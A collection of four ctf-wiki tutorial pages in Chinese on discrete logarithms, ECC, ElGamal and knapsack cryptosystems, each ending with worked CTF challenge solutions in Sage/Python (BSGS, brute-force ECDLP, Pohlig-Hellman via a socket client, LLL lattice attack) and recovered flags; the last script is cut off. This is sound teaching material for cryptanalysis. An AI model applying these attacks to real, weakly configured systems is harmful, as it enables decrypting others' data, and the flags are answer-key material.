{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/asymmetric/discrete-log/discrete-log.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/asymmetric/discrete-log/discrete-log.md", "content": "# 离散对数\n\n## 基本定义\n\n在了解离散对数时，我们先来了解几个基本定义。\n\n**定义1**\n\n在群 G 中，g 为 G 的生成元，也就是说群 G 中每一个元素都可以写成 $y=g^k$，我们称 k 为 y 在群 G 中的对数。\n\n**定义2**\n\n设 $m\\geq 1$，$(a,m)=1$ ，使得 $a^d \\equiv 1\\pmod m$ 成立的最小正整数 d 称为 a 对模 m 的指数或者阶，我们一般将其记为 $\\delta_m(a)$。\n\n**定义3**\n\n当 $\\delta_m(a)=\\varphi(m)$ 时，称 a 是模 m 的原根，简称 m 的原根。\n\n## 一些性质\n\n**性质1**\n\n使得 $a^d \\equiv 1\\pmod m$ 成立的最小正整数 $d$ ，必有$d\\mid\\varphi(m)$。\n\n**性质2**\n\n模 $m$ 剩余系存在原根的充要条件是 $m=2,4,p^{\\alpha},2p^{\\alpha}$ ，其中 $p$ 为奇素数， $\\alpha$ 为正整数。\n\n## 离散对数问题\n\n已知 $g,p,y$ ，对于方程 $y\\equiv g^x \\pmod p$ ，求解 $x$ 是一个难解问题。但是当 $p$ 具有一定的特性时就可能可以求解，比如，这个群的阶是一个光滑数。\n\n正是上述这个问题构成了目前很大一部分现代密码学，包括 Diffie–Hellman 密钥交换， ElGamal 算法，ECC 等。\n\n## 离散对数求解方式\n\n### 暴力破解\n\n给定 $y\\equiv g^x \\pmod p$，我们可以暴力枚举 $x$ 从而得到真正的 $x$ 的值。\n\n### Baby-step giant-step\n\n这一方法通常被称为小步大步法，这一方法使用了中间相遇攻击的思想。\n\n我们可以令 $x=im+j$，其中 $m= \\lceil \\sqrt n\\rceil$ ，那么整数 i 和 j 都在 0 到 m 的范围内。\n\n因此\n\n$$y=g^x=g^{im+j}$$\n\n也就是\n\n$$y(g^{-m})^i=g^j$$\n\n那么我们就可以枚举所有的 j 并进行计算，并将其存储到一个集合 S 中，然后我们再次枚举 i，计算 $y(g^{-m})^i$，一旦我们发现计算的结果在集合 S 中，则说明我们得到了一个碰撞，进而得到了 i 和 j。\n\n这显然是一个时间与空间的折中的方式，我们将一个 $O(n)$ 的时间复杂度，$O(1)$ 空间复杂度的算法转换为了一个$O(\\sqrt n)$的时间复杂度和$O(\\sqrt n)$ 的空间复杂度的算法。\n\n其中\n\n- 每一次 j 的增加表示“baby-step”，一次乘上 $g$。\n- 每一次 i 的增加表示“giant-step”，一次乘上 $g^{-m}$ 。\n\n```python\ndef bsgs(g, y, p):\n    m = int(ceil(sqrt(p - 1)))\n    S = {pow(g, j, p): j for j in range(m)}\n    gs = pow(g, p - 1 - m, p)\n    for i in range(m):\n        if y in S:\n            return i * m + S[y]\n        y = y * gs % p\n    return None\n```\n\n### Pollard’s ρ algorithm\n\n我们可以以$O(\\sqrt n)$的时间复杂度和$O(1)$ 的空间复杂度来解决上述问题。具体原理请自行谷歌。\n\n### Pollard’s kangaroo algorithm\n\n如果我们知道 x 的范围为 $a \\leq x \\leq b$，那么我们可以以$O(\\sqrt{b-a})$ 的时间复杂度解决上述问题。具体原理请自行谷歌。\n\n### Pohlig-Hellman algorithm\n\n不妨假设上述所提到的群关于元素 $g$ 的阶为 $n$， $n$ 为一个光滑数： $n=\\prod\\limits_{i=1}^r p_i^{e_i}$。\n\n1. 对于每个 $i \\in \\{1,\\ldots,r\\}$ ：\n    1. 计算 $g_i \\equiv g^{n/p_i^{e_i}} \\pmod m$。根据拉格朗日定理， $g_i$ 在群中的阶为 $p_i^{e_i}$ 。\n    2. 计算 $y_i \\equiv y^{n/p_i^{e_i}} \\equiv g^{xn/p_i^{e_i}} \\equiv g_i^{x} \\equiv g_i^{x \\bmod p_i^{e_i}} \\equiv g_i^{x_i} \\pmod m$，这里我们知道 $y_i,m,g_i$，而$x_i$ 的范围为$[0,p_i^{e_i})$，由 $n$ 是一个光滑数，可知其范围较小，因此我们可以使用 *Pollard’s kangaroo algorithm* 等方法快速求得$x_i$。\n2. 根据上述的推导，我们可以得到对于 $i \\in \\{1,\\ldots,r\\}$ ，$x \\equiv x_i \\pmod{p_i^{e_i}}$ ，该式可用中国剩余定理求解。\n\n\n上述过程可用下图简单描述：\n\n<center>\n![Pohlig Hellman Algorithm](figure/Pohlig-Hellman-Diagram.png)\n</center>\n\n其复杂度为$O\\left(\\sum\\limits _i e_i\\left(\\log n+\\sqrt{p_i}\\right)\\right)$，可以看出复杂度还是很低的。\n\n但当 $n$ 为素数，$m=2n+1$，那么复杂度和 $O(\\sqrt m)$ 是几乎没有差别的。\n\n## 2018 国赛 crackme java\n\n代码如下\n\n```java\nimport java.math.BigInteger;\nimport java.util.Random;\n\npublic class Test1 {\n    static BigInteger two =new BigInteger(\"2\");\n    static BigInteger p = new BigInteger(\"11360738295177002998495384057893129964980131806509572927886675899422214174408333932150813939357279703161556767193621832795605708456628733877084015367497711\");\n    static BigInteger h= new BigInteger(\"7854998893567208831270627233155763658947405610938106998083991389307363085837028364154809577816577515021560985491707606165788274218742692875308216243966916\");\n\n    /*\n     Alice write the below algorithm for encryption.\n     The public key {p, h} is broadcasted to everyone.\n    @param val: The plaintext to encrypt.\n        We suppose val only contains lowercase letter {a-z} and numeric charactors, and is at most 256 charactors in length.\n    */\n    public static String pkEnc(String val){\n        BigInteger[] ret = new BigInteger[2];\n        BigInteger bVal=new BigInteger(val.toLowerCase(),36);\n        BigInteger r =new BigInteger(new Random().nextInt()+\"\");\n        ret[0]=two.modPow(r,p);\n        ret[1]=h.modPow(r,p).multiply(bVal);\n        return ret[0].toString(36)+\"==\"+ret[1].toString(36);\n    }\n\n    /* Alice write the below algorithm for decryption. x is her private key, which she will never let you know.\n    public static String skDec(String val,BigInteger x){\n        if(!val.contains(\"==\")){\n            return null;\n        }\n        else {\n            BigInteger val0=new BigInteger(val.split(\"==\")[0],36);\n            BigInteger val1=new BigInteger(val.split(\"==\")[1],36);\n            BigInteger s=val0.modPow(x,p).modInverse(p);\n            return val1.multiply(s).mod(p).toString(36);\n        }\n    }\n   */\n\n    public static void main(String[] args) throws Exception {\n        System.out.println(\"You intercepted the following message, which is sent from Bob to Alice:\");\n        BigInteger bVal1=new BigInteger(\"a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco\",36);\n\tBigInteger bVal2=new BigInteger(\"2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc\",36);\n\tBigInteger r =new BigInteger(new Random().nextInt()+\"\");\n\tSystem.out.println(r);\n        System.out.println(bVal1);\n\tSystem.out.println(bVal2);\n\tSystem.out.println(\"a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco==2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc\");\n        System.out.println(\"Please figure out the plaintext!\");\n    }\n}\n```\n\n基本功能为计算\n\n$r_0=2^r \\bmod p$\n\n$r_1 =b*h^r \\bmod p$\n\n可以发现，r 的范围为 $[0,2^{32})$，所以我们可以使用 BSGS 算法，如下\n\n```python\nfrom sage.all import *\n\nc1 = int(\n    'a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco',\n    36\n)\nc2 = int(\n    '2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc',\n    36\n)\nprint c1, c2\np = 11360738295177002998495384057893129964980131806509572927886675899422214174408333932150813939357279703161556767193621832795605708456628733877084015367497711\nh = 7854998893567208831270627233155763658947405610938106998083991389307363085837028364154809577816577515021560985491707606165788274218742692875308216243966916\n# generate the group\nconst2 = 2\nconst2 = Mod(const2, p)\nc1 = Mod(c1, p)\nc2 = Mod(c2, p)\nh = Mod(h, p)\nprint '2', bsgs(const2, c1, bounds=(1, 2 ^ 32))\n\nr = 152351913\n\nnum = long(c2 / (h**r))\nprint num\n```\n\n## 参考\n\n- 初等数论，潘承洞，潘承彪\n- https://ee.stanford.edu/~hellman/publications/28.pdf\n- https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm#cite_note-Menezes97p108-2\n- https://fortenf.org/e/crypto/2017/12/03/survey-of-discrete-log-algos.html\n", "timestamp": "2025-10-21T22:02:45.637584"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/asymmetric/discrete-log/ecc.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/asymmetric/discrete-log/ecc.md", "content": "# ECC\n\n## 概述\n\nECC 全称为椭圆曲线加密，EllipseCurve Cryptography，是一种基于椭圆曲线数学的公钥密码。与传统的基于大质数因子分解困难性的加密方法不同，ECC依赖于解决椭圆曲线离散对数问题的困难性。它的优势主要在于相对于其它方法，它可以在使用较短密钥长度的同时保持相同的密码强度。目前椭圆曲线主要采用的有限域有\n\n- 以素数为模的整数域GF(p)，通常在通用处理器上更为有效。\n- 特征为 2 的伽罗华域GF（2^m），可以设计专门的硬件。\n\n## 基本知识\n\n我们首先来了解一下有限域上的椭圆曲线，有限域上的椭圆曲线是指在椭圆曲线的定义式\n\n$y^2+axy+by=x^3+cx^2+dx+e$\n\n中所有的系数都是在某个有限域GF(p)中的元素，其中p为一个大素数。\n\n当然，并不是所有的椭圆曲线都适合于加密，最为常用的方程如下\n\n$y^2=x^3+ax+b$\n\n其中$4a^3+27b^2 \\bmod p \\neq 0$\n\n我们称该方程的所有解(x,y)，($x\\in Fp , y \\in Fp$)，以及一个称为“无穷远点”(O)组成的集合为定义在Fp上的一个椭圆曲线，记为E(Fp)。\n\n一般定义椭圆曲线密码需要以下条件\n\n假设E(Fp)对于点的运算$\\oplus$ 形成一个able群（交换群，逆元存在，封闭性等），设$p\\in E(Fq)$ ，且满足下列条件的t很大\n\n$p \\oplus p \\oplus ... \\oplus p=O$\n\n其中共有t个p参与运算。这里我们称t为p的周期。此外，对于$Q\\in E(Fq)$ ，定有某个正整数m使得下列式子成立，定义$m=log_pq$\n\n$Q=m\\cdot p =p \\oplus p \\oplus ... \\oplus p$ （m个p参与运算）\n\n此外，假设G是该$E_q (a,b)$ 的生成元，即可以生成其中的所有元素，其阶为满足$nG=O$ 的最小正整数n。\n\n## ECC中的ElGamal\n\n这里我们假设用户B要把消息加密后传给用户A。\n\n### 密钥生成\n\n用户A先选择一条椭圆曲线$E_q (a,b)$ ，然后选择其上的一个生成元G，假设其阶为n，之后再选择一个正整数$n_a$作为密钥，计算$P_a=n_aG$。\n\n其中，$E_q(a,b), q,G$都会被公开。\n\n公钥为$P_a$，私钥为$n_a $。\n\n### 加密\n\n用户B在向用户A发送消息m，这里假设消息m已经被编码为椭圆曲线上的点，其加密步骤如下\n\n1. 查询用户A的公钥$E_q(a,b), q, P_a,G$ 。\n2. 在(1,q-1) 的区间内选择随机数k 。\n3. 根据A的公钥计算点$(x_1,y_1)=kG$ 。\n4. 计算点$(x_2,y_2)=kP_a$ ，如果为O，则从第二步重新开始。\n5. 计算$C=m+(x_2,y_2)$\n6. 将$((x_1,y_1),C)$ 发送给A。\n\n### 解密\n\n解密步骤如下\n\n1. 利用私钥计算点$n_a(x_1,y_1)=n_akG=kP_a=(x_2,y_2)$。\n2. 计算消息$m=C-(x_2,y_2)$ 。\n\n### 关键点\n\n这里的关键点在于我们即使知道了$(x_1,y_1)$ 也难以知道k，这是由离散对数的问题的难度决定的。\n\n## 2013 SECCON CTF quals Cryptanalysis\n\n这里我们以2013年SECCON CTF quals 中的 Cryptanalysis 为例，题目如下\n\n![img](./figure/2013-seccon-ctf-crypt-desp.png)\n\n这里，我们已知椭圆曲线方程以及对应的生成元 base，还知道相应的模数以及公钥以及加密后的结果。\n\n但是可以看出的我们的模数太小，我们暴力枚举获取结果。\n\n这里直接参考 github上的 sage 程序，暴力跑出 secret key。之后便可以解密了。\n\n```python\n\na = 1234577\nb = 3213242\nn = 7654319\n\nE = EllipticCurve(GF(n), [0, 0, 0, a, b])\n\nbase = E([5234568, 2287747])\npub = E([2366653, 1424308])\n\nc1 = E([5081741, 6744615])\nc2 = E([610619, 6218])\n\nX = base\n\nfor i in range(1, n):\n    if X == pub:\n        secret = i\n        print \"[+] secret:\", i\n        break\n    else:\n        X = X + base\n        print i\n\nm = c2 - (c1 * secret)\n\nprint \"[+] x:\", m[0]\nprint \"[+] y:\", m[1]\nprint \"[+] x+y:\", m[0] + m[1]\n```\n\n暴力跑出结果\n\n```shell\n[+] secret: 1584718\n[+] x: 2171002\n[+] y: 3549912\n[+] x+y: 5720914\n```\n\n## 参考\n\n- https://github.com/sonickun/ctf-crypto-writeups/tree/master/2013/seccon-ctf-quals/cryptanalysis\n", "timestamp": "2025-10-21T22:02:45.753561"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/asymmetric/discrete-log/elgamal.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/asymmetric/discrete-log/elgamal.md", "content": "# ElGamal\n\n## 概述\n\nElGamal算法的安全性是基于求解离散对数问题的困难性，于1984年提出，也是一种双钥密码体制，既可以用于加密又可用于数字签名。\n\n如果我们假设p是至少是160位的十进制素数，**并且p-1有大素因子**，此外g是 $Z_p^*$  的生成元，并且 $y \\in Z_p^*$  。那么如何找到一个唯一的整数x($0\\leq x \\leq p-2$) ，满足$g^x \\equiv y \\bmod p$ 在算法上是困难的，这里将x记为$x=log_gy$ 。\n\n## 基本原理\n\n这里我们假设A要给B发送消息m。\n\n### 密钥生成\n\n基本步骤如下\n\n1. 选取一个足够大的素数p，以便于在$Z_p$ 上求解离散对数问题是困难的。\n2. 选取$Z_p^*$ 的生成元g。\n3. 随机选取整数k,$0\\leq k \\leq p-2$ ，并计算$g^k \\equiv y \\bmod p$ 。\n\n其中私钥为{k}，公钥为{p,g,y} 。\n\n### 加密\n\nA选取随机数$r \\in Z_{p-1}$ ，对明文加密$E_k(m,r)=(y_1,y_2)$ 。其中$y_1 \\equiv g^r \\bmod p$ ，$y_2 \\equiv my^r \\bmod p$ 。\n\n### 解密\n\n$D_k(y_1,y_2)=y_2(y_1^k)^{-1} \\bmod p \\equiv m(g^k)^r(g^{rk})^{-1} \\equiv m \\bmod p$ 。\n\n### 难点\n\n虽然我们知道了y1,但是我们却没有办法知道其对应的r。\n\n## 2015 MMA CTF Alicegame\n\n这里我们以2015年 MMA-CTF-2015 中的 Alicegame 为例进行介绍。这题最初在没有给出源码的时候却是比较难做，因为这个给一个 m，给一个 r 就得到加密结果，，这太难想。\n\n我们来简单分析一下源码，首先程序最初生成了 pk 与 sk\n\n```python\n    (pk, sk) = genkey(PBITS)\n```\n\n其中genkey函数如下\n\n```python\ndef genkey(k):\n    p = getPrime(k)\n    g = random.randrange(2, p)\n    x = random.randrange(1, p-1)\n    h = pow(g, x, p)\n    pk = (p, g, h)\n    sk = (p, x)\n    return (pk, sk)\n```\n\np为k位的素数，g为(2,p)范围内的书，x在(1,p-1)范围内。并且计算了$h \\equiv g^x \\bmod p$ 。看到这里，差不多就知道，这应该是一个数域上的ElGamal加密了。其中pk为公钥，sk为私钥。\n\n接下来 程序输出了10次m和r。并且，利用如下函数加密\n\n```python\ndef encrypt(pk, m, r = None):\n    (p, g, h) = pk\n    if r is None:\n        r = random.randrange(1, p-1)\n    c1 = pow(g, r, p)\n    c2 = (m * pow(h, r, p)) % p\n    return (c1, c2)\n```\n\n其加密方法确实是ElGamal方式的加密。\n\n最后程序对flag进行了加密。此时的r是由程序自己random的。\n\n分析一下，这里我们在十轮循环中可以控制m和r，并且\n\n$c_1 \\equiv g^r \\bmod p$\n\n$c_2 \\equiv m * h^{r} \\bmod p$\n\n如果我们设置\n\n1. r=1，m=1，那么我们就可以获得$c_1=g,c_2=h$ 。\n2. r=1，m=-1，那么我们就可以获得$c_1=g, c_2 = p-h$ 。进而我们就可以得到素数p。\n\n我们得到素数p有什么用呢?p的位数在201位左右，很大啊。\n\n但是啊，它生成素数p之后，没有进行检查啊。我们在之前说过p-1必须有大素因子，如果有小的素因子的话，那我们就可以攻击了。其攻击主要是使用到了baby step-giant step 与 Pohlig-Hellman algorithm 算法，有兴趣的可以看看，这里sage本身自带的计算离散对数的函数已经可以处理这样的情况了，参见[discrete_log](http://doc.sagemath.org/html/en/reference/groups/sage/groups/generic.html) 。\n\n具体代码如下，需要注意的是，，这个消耗内存比较大，，不要随便拿虚拟机跑。。。还有就是这尼玛交互让我头疼啊，，，\n\n```python\nimport socket\nfrom Crypto.Util.number import *\nfrom sage.all import *\n\n\ndef get_maxfactor(N):\n    f = factor(N)\n    print 'factor done'\n    return f[-1][0]\n\nmaxnumber = 1 << 70\ni = 0\nwhile 1:\n    print 'cycle: ',i\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((\"localhost\", 9999))\n    sock.recv(17)\n    # get g,h\n    sock.recv(512)\n    sock.sendall(\"1\\n\")\n    sock.recv(512)\n    sock.sendall(\"1\\n\")\n    data = sock.recv(1024)\n    print data\n    if '\\n' in data:\n        data =data[:data.index('\\n')]\n    else:\n        # receive m=\n        sock.recv(1024)\n    (g,h) = eval(data)\n    \n    # get g,p\n    sock.sendall(\"-1\\n\")\n    sock.recv(512)\n    sock.sendall(\"1\\n\")\n    data = sock.recv(1024)\n    print data\n    if '\\n' in data:\n        data = data[:data.index('\\n')]\n    else:\n        # receive m=\n        sock.recv(512)\n    (g,tmp) = eval(data)\n    p = tmp+h\n    tmp = get_maxfactor(p-1)\n    if tmp<maxnumber:\n        print 'may be success'\n        # skip the for cycle\n        sock.sendall('quit\\n');\n        data = sock.recv(1024)\n        print 'receive data: ',data\n        data = data[data.index(\":\")+1:]\n        (c1,c2)=eval(data)\n        # generate the group\n        g = Mod(g, p)\n        h = Mod(h, p)\n        c1 = Mod(c1, p)\n        c2 = Mod(c2, p)\n        x = discrete_log(h, g)\n        print \"x = \", x\n        print \"Flag: \", long_to_bytes(long(c2 / ( c1 ** x)))\n    sock.sendall('quit\\n')\n    sock.recv(1024)\n    sock.close()\n    i += 1\n```\n\n最后迫于计算机内存不够，，没计算出来，，，有时候会崩，多运行几次。。\n\n## 2018 Code Blue lagalem\n\n题目描述如下\n\n```python\nfrom Crypto.Util.number import *\nfrom key import FLAG\n\nsize = 2048\nrand_state = getRandomInteger(size // 2)\n\n\ndef keygen(size):\n    q = getPrime(size)\n    k = 2\n    while True:\n        p = q * k + 1\n        if isPrime(p):\n            break\n        k += 1\n    g = 2\n    while True:\n        if pow(g, q, p) == 1:\n            break\n        g += 1\n    A = getRandomInteger(size) % q\n    B = getRandomInteger(size) % q\n    x = getRandomInteger(size) % q\n    h = pow(g, x, p)\n    return (g, h, A, B, p, q), (x,)\n\n\ndef rand(A, B, M):\n    global rand_state\n    rand_state, ret = (A * rand_state + B) % M, rand_state\n    return ret\n\n\ndef encrypt(pubkey, m):\n    g, h, A, B, p, q = pubkey\n    assert 0 < m <= p\n    r = rand(A, B, q)\n    c1 = pow(g, r, p)\n    c2 = (m * pow(h, r, p)) % p\n    return (c1, c2)\n\n# pubkey, privkey = keygen(size)\n\nm = bytes_to_long(FLAG)\nc1, c2 = encrypt(pubkey, m)\nc1_, c2_ = encrypt(pubkey, m)\n\nprint pubkey\nprint(c1, c2)\nprint(c1_, c2_)\n```\n\n可以看出，该算法就是一个 ElGamal 加密，给了同一个明文两组加密后的结果，其特点在于使用的随机数 r 是通过线性同余生成器生成的，则我们知道\n\n$c2 \\equiv m * h^{r} \\bmod p$\n\n$c2\\_ \\equiv m*h^{(Ar+B) \\bmod q} \\equiv m*h^{Ar+B}\\bmod p$\n\n则\n\n$c2^A*h^B/c2\\_ \\equiv m^{A-1}\\bmod p$\n\n其中，c2，c2_，A，B，h 均知道。则我们知道\n\n$m^{A-1} \\equiv t \\bmod p$\n\n我们假设已知 p 的一个原根 g，则我们可以假设\n\n$g^x \\equiv t$\n\n$g^y \\equiv m$\n\n则\n\n$g^{y(A-1)}\\equiv g^x \\bmod p$\n\n则\n\n$y(A-1) \\equiv x \\bmod p-1$\n\n进而我们知道\n\n$y(A-1)-k(p-1)=x$\n\n这里我们知道 A，p，x，则我们可以利用扩展欧几里得定理求得\n\n$s(A-1)+w(p-1)=gcd(A-1,p-1)$\n\n如果gcd(A-1,p-1)=d，则我们直接计算\n\n$t^s \\equiv m^{s(A-1)} \\equiv m^d \\bmod p$\n\n如果 d=1，则直接知道 m。\n\n如果 d 不为1，则就有点麻烦了。。\n\n这里这道题目中恰好 d=1，因此可以很容易进行求解。\n\n```python\nimport gmpy2\ndata = open('./transcript.txt').read().split('\\n')\ng, h, A, B, p, q = eval(data[0])\n\nc1, c2 = eval(data[1])\nc1_, c2_ = eval(data[2])\n\ntmp = gmpy2.powmod(c2, A, p) * gmpy2.powmod(h, B, p) * gmpy2.invert(c2_, p)\ntmp = tmp % p\n\nprint 't=', tmp\nprint 'A=', A\nprint 'p=', p\ngg, x, y = gmpy2.gcdext(A - 1, p - 1)\nprint gg\n\nm = gmpy2.powmod(tmp, x, p)\nprint hex(m)[2:].decode('hex')\n```\n\nflag\n\n```shell\n➜  2018-CodeBlue-lagalem git:(master) ✗ python exp.py\nt= 24200833701856688878756977616650401715079183425722900529883514170904572086655826119242478732147288453761668954561939121426507899982627823151671207325781939341536650446260662452251070281875998376892857074363464032471952373518723746478141532996553854860936891133020681787570469383635252298945995672350873354628222982549233490189069478253457618473798487302495173105238289131448773538891748786125439847903309001198270694350004806890056215413633506973762313723658679532448729713653832387018928329243004507575710557548103815480626921755313420592693751934239155279580621162244859702224854316335659710333994740615748525806865323\nA= 22171697832053348372915156043907956018090374461486719823366788630982715459384574553995928805167650346479356982401578161672693725423656918877111472214422442822321625228790031176477006387102261114291881317978365738605597034007565240733234828473235498045060301370063576730214239276663597216959028938702407690674202957249530224200656409763758677312265502252459474165905940522616924153211785956678275565280913390459395819438405830015823251969534345394385537526648860230429494250071276556746938056133344210445379647457181241674557283446678737258648530017213913802458974971453566678233726954727138234790969492546826523537158\np= 36416598149204678746613774367335394418818540686081178949292703167146103769686977098311936910892255381505012076996538695563763728453722792393508239790798417928810924208352785963037070885776153765280985533615624550198273407375650747001758391126814998498088382510133441013074771543464269812056636761840445695357746189203973350947418017496096468209755162029601945293367109584953080901393887040618021500119075628542529750701055865457182596931680189830763274025951607252183893164091069436120579097006203008253591406223666572333518943654621052210438476603030156263623221155480270748529488292790643952121391019941280923396132717\n1\nCBCTF{183a3ce8ed93df613b002252dfc741b2}\n```\n\n## 参考\n\n- https://www.math.auckland.ac.nz/~sgal018/crypto-book/solns.pdf，20.4.1\n", "timestamp": "2025-10-21T22:02:45.868932"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/asymmetric/knapsack/knapsack.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/asymmetric/knapsack/knapsack.md", "content": "# 背包加密\n\n## 背包问题\n\n首先，我们先来介绍一下背包问题，假定一个背包可以称重 W，现在有 n 个物品，其重量分别为 $a_1, a_2,...,a_n$ 我们想问一下装哪些物品可以恰好使得背包装满，并且每个物品只能被装一次。这其实就是在解这样的一个问题\n\n$$\nx_1a_1+x_2a_2+,...,+x_na_n=W\n$$\n\n其中所有的 $x_i$ 只能为 0 和 1。显然我们必须枚举所有的 n 个物品的组合才能解决这个问题，而复杂度也就是 $2^n$，这也就是背包加密的妙处所在。\n\n在加密时，如果我们想要加密的明文为 x，那么我们可以将其表示为 n 位二进制数，然后分别乘上 $a_i$ 即可得到加密结果。\n\n但是解密的时候，该怎么办呢？我们确实让其他人难以解密密文，但是我们自己也确实没有办法解密密文。\n\n但是当 $a_i$ 是超递增的话，我们就有办法解了，所谓超递增是指序列满足如下条件\n\n$$\na_i>\\sum_{k=1}^{i-1}a_k\n$$\n\n即第 i 个数大于前面所有数的和。\n\n为什么满足这样的条件就可以解密了呢？这是因为如果加密后的结果大于 $a_n$ 的话，其前面的系数为必须 1 的。反之，无论如何也无法使得等式成立。因此，我们可以立马得到对应的明文。\n\n但是，这样又出现了一个问题，由于 $a_i$ 是公开的，如果攻击者截获了密文，那么它也就很容易去破解这样的密码。为了弥补这样的问题，就出现了 Merkle–Hellman 这样的加密算法，我们可以使用初始的背包集作为私钥，变换后的背包集作为公钥，再稍微改动加密过程，即可。\n\n这里虽然说了超递增序列，但是却没有说是如何生成的。\n\n## Merkle–Hellman\n\n### 公私钥生成\n\n#### 生成私钥\n\n私钥就是我们的初始的背包集，这里我们使用超递增序列，怎么生成呢？我们可以假设 $a_1=1$，那么 $a_2$ 大于 1 即可，类似的可以依次生成后面的值。\n\n#### 生成公钥\n\n在生成公钥的过程中主要使用了模乘的运算。\n\n首先，我们生成模乘的模数 m，这里要确保\n\n$$\nm>\\sum_{i=1}^{i=n}a_i\n$$\n\n其次，我们选择模乘的乘数 w，作为私钥并且确保\n\n$$\ngcd(w,m)=1\n$$\n\n之后，我们便可以通过如下公式生成公钥\n\n$$\nb_i \\equiv w a_i \\bmod m\n$$\n\n并将这个新的背包集 $b_i$ 和 m 作为公钥。\n\n### 加解密\n\n#### 加密\n\n假设我们要加密的明文为 v，其每一个比特位为 $v_i$，那么我们加密的结果为\n\n$$\n\\sum_{i=1}^{i=n}b_iv_i \\bmod m\n$$\n\n#### 解密\n\n对于解密方，首先可以求的 w 关于 m 的逆元 $w^{-1}$。\n\n然后我们可以将得到的密文乘以 $w^{-1}$ 即可得到明文，这是因为\n\n$$\n\\sum_{i=1}^{i=n}w^{-1}b_iv_i \\bmod m=\\sum_{i=1}^{i=n}a_iv_i \\bmod m\n$$\n\n这里有\n\n$$\nb_i \\equiv w a_i \\bmod m\n$$\n\n对于每一块的加密的消息都是小于 m 的，所以求得结果自然也就是明文了。\n\n### 破解\n\n该加密体制在提出后两年后该体制即被破译，破译的基本思想是我们不一定要找出正确的乘数 w（即陷门信息），只需找出任意模数 `m′` 和乘数 `w′`，只要使用 `w′` 去乘公开的背包向量 B 时，能够产生超递增的背包向量即可。\n\n### 例子\n\n这里我们以 2014 年 ASIS Cyber Security Contest Quals 中的 Archaic 为例，[题目链接](https://github.com/ctfs/write-ups-2014/tree/b02bcbb2737907dd0aa39c5d4df1d1e270958f54/asis-ctf-quals-2014/archaic)。\n\n首先查看源程序\n\n```python\nsecret = 'CENSORED'\nmsg_bit = bin(int(secret.encode('hex'), 16))[2:]\n```\n\n首先得到了 secret 的所有二进制位。\n\n其次，利用如下函数得到 keypair，包含公钥与私钥。\n\n```python\nkeyPair = makeKey(len(msg_bit))\n```\n\n仔细分析 makekey 函数，如下\n\n```python\ndef makeKey(n):\n\tprivKey = [random.randint(1, 4**n)]\n\ts = privKey[0]\n\tfor i in range(1, n):\n\t\tprivKey.append(random.randint(s + 1, 4**(n + i)))\n\t\ts += privKey[i]\n\tq = random.randint(privKey[n-1] + 1, 2*privKey[n-1])\n\tr = random.randint(1, q)\n\twhile gmpy2.gcd(r, q) != 1:\n\t\tr = random.randint(1, q)\n\tpubKey = [ r*w % q for w in privKey ]\n\treturn privKey, q, r, pubKey\n```\n\n可以看出 prikey 是一个超递增序列，并且得到的 q 比 prikey 中所有数的和还要大，此外我们得到的 r，恰好与 q 互素，这一切都表明了该加密是一个背包加密。\n\n果然加密函数就是对于消息的每一位乘以对应的公钥并求和。\n\n```python\ndef encrypt(msg, pubKey):\n\tmsg_bit = msg\n\tn = len(pubKey)\n\tcipher = 0\n\ti = 0\n\tfor bit in msg_bit:\n\t\tcipher += int(bit)*pubKey[i]\n\t\ti += 1\n\treturn bin(cipher)[2:]\n```\n\n对于破解的脚本我们直接使用 [GitHub](https://github.com/ctfs/write-ups-2014/tree/b02bcbb2737907dd0aa39c5d4df1d1e270958f54/asis-ctf-quals-2014/archaic) 上的脚本。进行一些简单的修改。\n\n```python\nimport binascii\n# open the public key and strip the spaces so we have a decent array\nfileKey = open(\"pub.Key\", 'rb')\npubKey = fileKey.read().replace(' ', '').replace('L', '').strip('[]').split(',')\nnbit = len(pubKey)\n# open the encoded message\nfileEnc = open(\"enc.txt\", 'rb')\nencoded = fileEnc.read().replace('L', '')\nprint \"start\"\n# create a large matrix of 0's (dimensions are public key length +1)\nA = Matrix(ZZ, nbit + 1, nbit + 1)\n# fill in the identity matrix\nfor i in xrange(nbit):\n    A[i, i] = 1\n# replace the bottom row with your public key\nfor i in xrange(nbit):\n    A[i, nbit] = pubKey[i]\n# last element is the encoded message\nA[nbit, nbit] = -int(encoded)\n\nres = A.LLL()\nfor i in range(0, nbit + 1):\n    # print solution\n    M = res.row(i).list()\n    flag = True\n    for m in M:\n        if m != 0 and m != 1:\n            flag = False\n            break\n    if flag:\n        print i, M\n        M = ''.join(str(j) for j in M)\n        # remove the last bit\n        M = M[:-1]\n        M = hex(int(M, 